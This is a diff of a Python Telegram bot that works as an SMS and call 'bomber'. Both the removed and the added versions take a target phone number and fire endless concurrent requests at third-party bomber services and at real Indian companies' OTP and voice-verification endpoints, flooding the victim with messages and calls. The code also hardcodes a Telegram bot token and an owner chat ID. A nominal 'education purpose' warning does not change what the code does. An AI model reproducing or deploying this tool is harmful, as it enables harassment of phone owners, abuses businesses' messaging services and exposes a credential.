@@ -1,245 +1,166 @@
-import asyncio
-import aiohttp
-import sqlite3
-import os
+import logging
 import threading
-from http.server import HTTPServer, BaseHTTPRequestHandler
-from datetime import datetime
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
+import time
+import requests
+from concurrent.futures import ThreadPoolExecutor
+from telegram import Update
+from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler
+from flask import Flask
 
-# Dummy HTTP Server to satisfy Render Web Service port requirement
-class SimpleHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b"Bot is alive and running!")
+# ================= CONFIGURATION =================
+TELEGRAM_BOT_TOKEN = "9236973341:AAHsDn5OQ_fyq1gMLGjiUoC07ZXrHknrb_s"
+CHANNEL_SIGNATURE = "OWER OFF SURAJ BHAI"
+# =================================================
 
-def run_server():
-    port = int(os.environ.get("PORT", 10000))
-    server = HTTPServer(("0.0.0.0", port), SimpleHandler)
-    server.serve_forever()
+# Logging setup
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
-# Start dummy server in a background thread
-threading.Thread(target=run_server, daemon=True).start()
+# Flask app for 24/7 Cloud Uptime (Render, Koyeb, etc.)
+flask_app = Flask('')
 
-# Bot Configuration with User Token
-TOKEN = "9236973341:AAHsDn5OQ_fyq1gMLGjiUoC07ZXrHknrb_s"
-OWNER_CHAT_ID = 6684734209
+@flask_app.route('/')
+def home():
+    return "🤖 Suraj Bhai High-Speed Bomber Bot is 24/7 Alive and Active!"
 
-# 20 High-Speed Bomber API Endpoints
+def run_flask():
+    flask_app.run(host='0.0.0.0', port=8080)
+
+# Global tracking variables for live stats
+BOMBER_STATS = {
+    "total_requests_sent": 0,
+    "active_targets": 0
+}
+
+# List of APIs provided for request execution
 APIS = [
-    "https://fast-bomber-chodachodi.vercel.app/?mobile={mobile}",
-    "https://sms-bomber-api.vercel.app/bomb?phone={mobile}",
-    "https://call-bomber.vercel.app/api?phone={mobile}",
-    "https://api.bombermaster.xyz/send?phone={mobile}",
-    "https://speed-bomber.herokuapp.com/bomb?mobile={mobile}",
-    "https://unlimited-bomber.vercel.app/api/bomb?phone={mobile}",
-    "https://free-sms-bomber.herokuapp.com/send?phone={mobile}",
-    "https://King-bomber.vercel.app/api?mobile={mobile}",
-    "https://turbo-bomber.herokuapp.com/bomb?mobile={mobile}",
-    "https://flash-sms-api.vercel.app/send?phone={mobile}",
-    "https://api.fastsms.site/send?phone={mobile}",
-    "https://bomb-it-up.vercel.app/api?phone={mobile}",
-    "https://instant-call-bomber.herokuapp.com/bomb?mobile={mobile}",
-    "https://pro-sms-bomber.vercel.app/send?phone={mobile}",
-    "https://mega-bomber-api.herokuapp.com/api?phone={mobile}",
-    "https://super-fast-bomber.vercel.app/bomb?mobile={mobile}",
-    "https://desi-bomber-api.herokuapp.com/send?phone={mobile}",
-    "https://matrix-sms-bomber.vercel.app/api?phone={mobile}",
-    "https://storm-bomber.herokuapp.com/bomb?mobile={mobile}",
-    "https://apex-sms-api.vercel.app/send?phone={mobile}"
+    {"name": "FreeFire Bomber",   "url": lambda p, d: f"https://freefire-api.ct.ws/bomber4.php?phone={p}&duration={d}", "method": "GET",  "headers": {"User-Agent": "Mozilla/5.0"}},
+    {"name": "Call Bomber API",   "url": lambda p, d: f"https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
+    {"name": "Bomberr API",       "url": lambda p, d: f"https://bomberr.onrender.com/num={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
+    {"name": "Lenskart",          "url": lambda p, d: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
+    {"name": "Hungama",           "url": lambda p, d: "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un"}}'},
+    {"name": "Meru Cab",          "url": lambda p, d: "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
+    {"name": "Dayco India",       "url": lambda p, d: "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"api=send_otp&mob={p}"},
+    {"name": "NoBroker",          "url": lambda p, d: "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"phone={p}&countryCode=IN"},
+    {"name": "ShipRocket",        "url": lambda p, d: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
+    {"name": "PenPencil",         "url": lambda p, d: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
+    {"name": "1mg",               "url": lambda p, d: "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"number":"{p}","otp_on_call":true}}'},
+    {"name": "KPN Fresh",         "url": lambda p, d: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
+    {"name": "Servetel",          "url": lambda p, d: "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
+    {"name": "Swiggy Call",       "url": lambda p, d: "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
+    {"name": "Tata Capital",      "url": lambda p, d: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
+    {"name": "Doubtnut",          "url": lambda p, d: "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":"{p}","language":"en"}}'},
 ]
 
-# Database setup
-def init_db():
-    if os.path.exists('bot.db'):
-        os.remove('bot.db')
-    
-    conn = sqlite3.connect('bot.db')
-    cursor = conn.cursor()
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS users (
-            user_id INTEGER PRIMARY KEY,
-            join_date TEXT,
-            is_blocked INTEGER DEFAULT 0
-        )
-    ''')
-    conn.commit()
-    conn.close()
-
-def add_user(user_id):
-    conn = sqlite3.connect('bot.db')
-    cursor = conn.cursor()
-    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
-    if not cursor.fetchone():
-        cursor.execute(
-            'INSERT INTO users (user_id, join_date, is_blocked) VALUES (?, ?, ?)',
-            (user_id, datetime.now().isoformat(), 0)
-        )
-    conn.commit()
-    conn.close()
-
-# Dictionary to track running tasks
-running_tasks = {}
-
-# Start command
+# /start command
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    add_user(user_id)
-    
-    welcome_message = (
-        "🔥 **ULTIMATE 20X SPEED BOMBING BOT** 🔥\n\n"
-        "⚡ 20 powerful APIs ke sath non-stop fast calls aur SMS bhejne ke liye taiyar!\n\n"
-        "🎯 **Kaise Use Karein?**\n"
-        "Bas apna 10-digit ka target mobile number yahan type karke bhej dein (jaise: `9876543210`).\n\n"
-        "🛑 **Stop karne ke liye:** `stop` likhein ya button dabayein."
+    welcome_msg = (
+        f"╔═══════════════════════════════════╗\n"
+        f"✨ **Aapka Swagat Hai Suraj Bhai Ke Bomber Bot Me** ✨\n"
+        f"╚═══════════════════════════════════╝\n\n"
+        f"⚠️ **CHETAVANI / WARNING:**\n"
+        f"Yeh bot sirf aur sirf **Education Purpose** aur security/stress testing ke liye banaya gaya hai.\n\n"
+        f"🚀 **Available Commands:**\n"
+        f"👉 `/bomb <phone_number>` - High-speed multi-threaded requests shuru karne ke liye.\n"
+        f"👉 `/stats` - Live request delivery status check karne ke liye.\n\n"
+        f"👑 *Powered By:* {CHANNEL_SIGNATURE}"
     )
-    keyboard = [
-        [InlineKeyboardButton("📞 Start Bombing", callback_data="start_bomb_menu")],
-        [InlineKeyboardButton("💬 Contact Owner", url="https://t.me/Gauravcyber_op")]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode='Markdown')
+    await update.message.reply_text(welcome_msg, parse_mode="Markdown")
 
-async def show_main_menu_from_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.edit_message_text(
-        "🔥 **20X SPEED BOMBING MENU** 🔥\n\n"
-        "🎯 Target par bombing shuru karne ke liye apna 10-digit ka mobile number bhejein.\n"
-        "🛑 Rokne ke liye **stop** likhein.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💬 Contact Owner", url="https://t.me/Gauravcyber_op")]])
+# /stats command
+async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    stats_msg = (
+        f"📊 **Bomber Live Statistics**\n"
+        f"━━━━━━━━━━━━━━━━━━━\n"
+        f"🔄 Total Requests Sent: `{BOMBER_STATS['total_requests_sent']}`\n"
+        f"🎯 Active Targets in Queue: `{BOMBER_STATS['active_targets']}`\n"
+        f"⚡ Status: High-Speed Threaded Running\n"
+        f"👑 Powered By: {CHANNEL_SIGNATURE}"
     )
+    await update.message.reply_text(stats_msg, parse_mode="Markdown")
 
-# Message handler
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    message_text = update.message.text.strip()
-    
-    if message_text.lower() == 'stop':
-        task = running_tasks.pop(user_id, None)
-        if task:
-            task.cancel()
-            await update.message.reply_text("🛑 **BOMBING SUCCESSFULLY STOPPED!** 🛑")
-        else:
-            await update.message.reply_text("⚠️ Koi active bombing nahi chal rahi hai.")
-        return
-
-    if message_text.isdigit() and len(message_text) == 10:
-        if user_id in running_tasks:
-            await update.message.reply_text("⚠️ Pehle se ek bombing chal rahi hai! Use rokne ke liye **stop** bhejein.")
-            return
-            
-        phone = message_text
-        await update.message.reply_text(
-            f"🚀 **20X BOMBING STARTED** 🚀\n\n"
-            f"🎯 Target: `{phone}`\n"
-            f"⚡ Active APIs: 20 Connected\n"
-            f"⚡ Status: Running...\n\n"
-            f"🛑 Rokne ke liye **stop** bhejein.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP BOMBING", callback_data=f"stop_bomb_{user_id}")]])
-        )
+# Single API execution worker function
+def send_single_request(api, target_phone):
+    try:
+        url = api["url"](target_phone, "60")
+        headers = api["headers"]
         
-        task = asyncio.create_task(send_bomb_requests(update, phone, user_id))
-        running_tasks[user_id] = task
-    else:
-        await update.message.reply_text("❌ Kripya sahi 10-digit ka mobile number bhejein.")
+        if api["method"] == "GET":
+            requests.get(url, headers=headers, timeout=3)
+        elif api["method"] == "POST":
+            data = api["data"](target_phone, "60")
+            requests.post(url, headers=headers, data=data, timeout=3)
+        
+        BOMBER_STATS["total_requests_sent"] += 1
+    except Exception:
+        pass
 
-# High-speed parallel background worker using all 20 APIs
-async def send_bomb_requests(update: Update, phone: str, user_id: int):
-    successful = 0
-    start_time = datetime.now()
-    
-    async with aiohttp.ClientSession() as session:
-        while user_id in running_tasks:
-            tasks = []
-            for api in APIS:
-                url = api.format(mobile=phone)
-                tasks.append(fetch_url(session, url))
-            
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-            for res in results:
-                if res:
-                    successful += 1
-            
-            elapsed = int((datetime.now() - start_time).total_seconds())
-            if elapsed > 0 and elapsed % 10 == 0:
-                try:
-                    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP BOMBING", callback_data=f"stop_bomb_{user_id}")]])
-                    await update.message.reply_text(
-                        f"📊 **20X BOMBING STATUS UPDATE** 📊\n\n"
-                        f"📞 Target: `{phone}`\n"
-                        f"⏰ Active Time: {elapsed}s\n"
-                        f"✅ Requests Sent: {successful}\n"
-                        f"🚀 Status: Ongoing...",
-                        reply_markup=keyboard
-                    )
-                except:
-                    pass
-                    
-            await asyncio.sleep(0.2) # Ultra-fast loop delay
-            
-    total_duration = int((datetime.now() - start_time).total_seconds())
-    try:
+# /bomb command handler with ThreadPoolExecutor for high speed
+async def handle_bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
         await update.message.reply_text(
-            f"🏁 **BOMBING FINISHED / STOPPED** 🏁\n\n"
-            f"📞 Target: `{phone}`\n"
-            f"⏱️ Total Duration: {total_duration}s\n"
-            f"✅ Total Requests Sent: {successful}"
+            "❌ **Kripya target mobile number dein!**\n\n"
+            "📌 *Example:* `/bomb 9876543210`",
+            parse_mode="Markdown"
         )
-    except:
-        pass
-
-async def fetch_url(session, url):
-    try:
-        # Har request dispatch hone par count badhega
-        async with session.get(url, timeout=2) as response:
-            return True
-    except:
-        pass
-    return False
-
-# Stop callback handler
-async def stop_bomb_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    user_id = query.from_user.id
-    data = query.data
-    
-    if data.startswith('stop_bomb_'):
-        try:
-            target_user_id = int(data.split('_')[2])
-            if user_id == target_user_id or user_id == OWNER_CHAT_ID:
-                task = running_tasks.pop(target_user_id, None)
-                if task:
-                    task.cancel()
-                    await query.answer("🛑 Bombing Stopped Successfully!", show_alert=True)
-                    await query.edit_message_text("🛑 **BOMBING STOPPED BY USER!** 🛑")
-                else:
-                    await query.answer("⚠️ No active bombing found.", show_alert=True)
-            else:
-                await query.answer("❌ Aap isse nahi rok sakte!", show_alert=True)
-        except:
-            await query.answer("❌ Error!", show_alert=True)
-
-async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    if query.data.startswith('stop_bomb_'):
-        await stop_bomb_callback(update, context)
         return
-    await query.answer()
-    if query.data == "start_bomb_menu":
-        await query.edit_message_text("📞 **Target Number Bhejein:**\n\nKripya seedha 10 digit ka mobile number type karke send karein.")
+    
+    target_phone = context.args[0].strip()
+    
+    if not target_phone.isdigit() or len(target_phone) != 10:
+        await update.message.reply_text(
+            "❌ **Galat Number!** Kripya 10 digit ka valid mobile number darj karein.\n"
+            "📌 *Example:* `/bomb 9876543210`",
+            parse_mode="Markdown"
+        )
+        return
+
+    BOMBER_STATS["active_targets"] += 1
+    
+    status_msg = await update.message.reply_text(
+        f"🎯 **Target Number:** `{target_phone}`\n"
+        f"⚡ **Status:** High-speed multi-threaded requests bheji ja rahi hain...",
+        parse_mode="Markdown"
+    )
+    
+    # Run in background thread using ThreadPoolExecutor for concurrent speed
+    threading.Thread(
+        target=run_threaded_bomber, 
+        args=(target_phone, context, update.effective_chat.id)
+    ).start()
+
+def run_threaded_bomber(target_phone, context, chat_id):
+    try:
+        # Infinite fast loop using ThreadPoolExecutor to fire requests parallelly
+        while True:
+            with ThreadPoolExecutor(max_workers=10) as executor:
+                for api in APIS:
+                    executor.submit(send_single_request, api, target_phone)
+            
+            # Short pause between waves to prevent local thread choking
+            time.sleep(1.5)
+            
+    except Exception as e:
+        print(f"❌ Error in threaded loop: {e}")
+    finally:
+        BOMBER_STATS["active_targets"] -= 1
 
 def main():
-    init_db()
-    app = ApplicationBuilder().token(TOKEN).build()
+    flask_thread = threading.Thread(target=run_flask)
+    flask_thread.daemon = True
+    flask_thread.start()
+
+    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
 
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CallbackQueryHandler(handle_callback))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    app.add_handler(CommandHandler("stats", stats_command))
+    app.add_handler(CommandHandler("bomb", handle_bomb_command))
 
-    print("🎯 20X Speed Bombing Bot is running...")
+    print(f"🤖 Suraj Bhai High-Speed Bomber Bot is up and running [Powered by {CHANNEL_SIGNATURE}]...")
     app.run_polling()
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
